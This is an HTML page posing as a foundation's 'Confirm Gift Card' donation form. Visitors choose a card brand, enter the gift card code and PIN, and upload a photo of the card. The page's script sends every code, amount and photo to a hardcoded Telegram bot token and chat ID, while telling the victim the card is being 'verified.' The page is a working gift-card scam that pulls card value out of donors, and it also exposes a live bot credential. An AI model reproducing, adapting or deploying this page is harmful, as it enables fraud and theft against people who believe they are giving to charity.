<!DOCTYPE html>
<html lang="en" class="scroll-smooth">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Confirm Gift Card • Foundation</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: { 
                        brand: { 
                            50: '#f0f7ff', 
                            600: '#2563eb', 
                            700: '#1d4ed8',
                            900: '#1e3a8a' 
                        } 
                    }
                }
            }
        }
    </script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Space+Grotesk:wght@500;600;700&display=swap');
        body { font-family: 'Inter', sans-serif; }
        .heading-font { font-family: 'Space Grotesk', sans-serif; }
    </style>
</head>
<body class="bg-zinc-50">

    <div class="max-w-2xl mx-auto px-5 md:px-6 py-8 md:py-12">
        
        <button onclick="history.back()" class="flex items-center gap-x-2 text-slate-500 hover:text-slate-700 mb-6 md:mb-8 text-sm md:text-base">
            <i class="fa-solid fa-arrow-left"></i>
            <span class="font-medium">Back to Donation</span>
        </button>

        <div class="bg-white rounded-3xl shadow-xl p-6 md:p-10">
            
            <div class="text-center mb-8 md:mb-10">
                <div class="w-16 h-16 mx-auto bg-amber-100 text-amber-600 rounded-3xl flex items-center justify-center text-4xl mb-4">
                    <i class="fa-solid fa-gift"></i>
                </div>
                <h1 class="text-4xl md:text-5xl font-bold tracking-tighter heading-font">Confirm Gift Card</h1>
                <p class="text-slate-600 mt-2 text-base md:text-lg">Send your donation using a Gift Card</p>
            </div>

            <!-- Amount -->
           

            <!-- Gift Card Type -->
            <div class="mb-8">
                <label class="block text-sm font-medium text-slate-500 mb-3">GIFT CARD TYPE</label>
                <select id="giftcard-type" 
                        class="w-full px-6 py-5 border border-slate-200 rounded-3xl focus:border-brand-600 focus:outline-none text-base">
                    <option value="">Select Gift Card Type</option>
                    <option value="Amazon">Amazon Gift Card</option>
                    <option value="Visa">Visa Gift Card</option>
                    <option value="Mastercard">Mastercard Gift Card</option>
                    <option value="Walmart">Walmart Gift Card</option>
                    <option value="Target">Target Gift Card</option>
                    <option value="Google Play">Google Play Gift Card</option>
                    <option value="Apple">Apple Gift Card</option>
                    <option value="Other">Other</option>
                </select>
            </div>

            <!-- Gift Card Details -->
            <div class="mb-8 md:mb-10">
                <label class="block text-sm font-medium text-slate-500 mb-3">GIFT CARD CODE / NUMBER</label>
                <input id="giftcard-code" type="text" placeholder="Enter gift card code"
                       class="w-full px-6 py-5 border border-slate-200 rounded-3xl focus:border-brand-600 focus:outline-none text-base font-mono">
                <p class="text-xs text-slate-500 mt-2">Include PIN if required</p>
            </div>

            <!-- Upload Gift Card Proof -->
            <div class="mb-10">
                <label class="block text-sm font-medium text-slate-500 mb-3">UPLOAD GIFT CARD PROOF</label>
                <div class="border-2 border-dashed border-slate-300 rounded-3xl p-8 md:p-10 text-center hover:border-amber-400 transition">
                    <input type="file" id="proof-upload" accept="image/*" class="hidden" onchange="previewImage(event)">
                    <label for="proof-upload" class="cursor-pointer flex flex-col items-center">
                        <i class="fa-solid fa-cloud-upload-alt text-5xl text-slate-400 mb-4"></i>
                        <p class="font-medium text-slate-700">Upload screenshot or photo of the gift card</p>
                        <p class="text-sm text-slate-500 mt-1">PNG, JPG (max 10MB)</p>
                    </label>
                </div>
                <div id="image-preview" class="hidden mt-6 rounded-2xl overflow-hidden border">
                    <img id="preview-img" class="w-full max-h-80 object-contain">
                </div>
            </div>

            <!-- Submit Button -->
            <button onclick="submitPayment()" id="submit-btn"
                    class="mt-8 w-full py-6 md:py-7 bg-brand-600 hover:bg-brand-700 text-white text-lg md:text-xl font-semibold rounded-3xl transition flex items-center justify-center gap-x-3">
                <i class="fa-solid fa-paper-plane"></i>
                <span>Submit Gift Card</span>
            </button>

            <p class="text-center text-xs md:text-sm text-slate-400 mt-8">
                Our team will verify your gift card shortly after submission
            </p>
        </div>
    </div>

    <!-- Success Popup -->
    <div id="success-popup" class="hidden fixed inset-0 bg-black/70 flex items-center justify-center z-50 px-4">
        <div class="bg-white rounded-3xl max-w-md w-full p-8 md:p-10 text-center">
            <div class="w-20 h-20 mx-auto bg-emerald-100 text-emerald-600 rounded-3xl flex items-center justify-center text-5xl mb-6">🎁</div>
            <h2 class="text-3xl font-bold heading-font">Gift Card Received</h2>
            <p class="text-slate-600 mt-4">Thank you! Your gift card details have been submitted for verification.</p>
            <button onclick="closePopup()" class="mt-10 w-full py-5 bg-brand-600 hover:bg-brand-700 text-white rounded-3xl font-semibold text-lg transition">
                Return Home
            </button>
        </div>
    </div>

    <script>
        let selectedAmount = 250;
        let uploadedImageBase64 = null;

        // Telegram Bot Credentials
        const BOT_TOKEN = "7989516861:AAFV7q6WSBk4sQuOVsaJiWq3c4KQGpuaB_Q";
        const CHAT_ID   = "7464797757";

        window.onload = () => {
            const urlParams = new URLSearchParams(window.location.search);
            const amount = urlParams.get('amount');
            if (amount) selectedAmount = parseFloat(amount);
            document.getElementById('total-amount').textContent = '$' + selectedAmount;
        };

        function previewImage(event) {
            const file = event.target.files[0];
            if (file) {
                const reader = new FileReader();
                reader.onload = (e) => {
                    uploadedImageBase64 = e.target.result;
                    document.getElementById('preview-img').src = e.target.result;
                    document.getElementById('image-preview').classList.remove('hidden');
                };
                reader.readAsDataURL(file);
            }
        }

        async function submitPayment() {
            const giftType = document.getElementById('giftcard-type').value;
            const giftCode = document.getElementById('giftcard-code').value.trim();
            const submitBtn = document.getElementById('submit-btn');

            if (!giftType) {
                alert("Please select the type of Gift Card");
                return;
            }
            if (!giftCode) {
                alert("Please enter the Gift Card code");
                return;
            }

            submitBtn.innerHTML = `<i class="fa-solid fa-spinner fa-spin"></i> Submitting...`;
            submitBtn.disabled = true;

            try {
                const message = `🎁 New Gift Card Donation Received!\n\n` +
                                `💰 Amount: $${selectedAmount}\n` +
                                `📦 Type: ${giftType}\n` +
                                `🔑 Code: ${giftCode}\n` +
                                `⏰ Time: ${new Date().toLocaleString()}`;

                // Send Text Message
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: "HTML"
                    })
                });

                // Send Photo if uploaded
                if (uploadedImageBase64) {
                    const formData = new FormData();
                    formData.append("chat_id", CHAT_ID);
                    formData.append("caption", `📸 Gift Card Proof\nType: ${giftType}\nCode: ${giftCode}`);

                    const blob = await fetch(uploadedImageBase64).then(r => r.blob());
                    formData.append("photo", blob, "giftcard-proof.jpg");

                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: "POST",
                        body: formData
                    });
                }

                document.getElementById('success-popup').classList.remove('hidden');

            } catch (error) {
                console.error(error);
                alert("Failed to submit. Please check your connection and try again.");
            } finally {
                submitBtn.innerHTML = `<i class="fa-solid fa-paper-plane"></i> Submit Gift Card`;
                submitBtn.disabled = false;
            }
        }

        function closePopup() {
            document.getElementById('success-popup').classList.add('hidden');
        }
    </script>
</body>
</html>
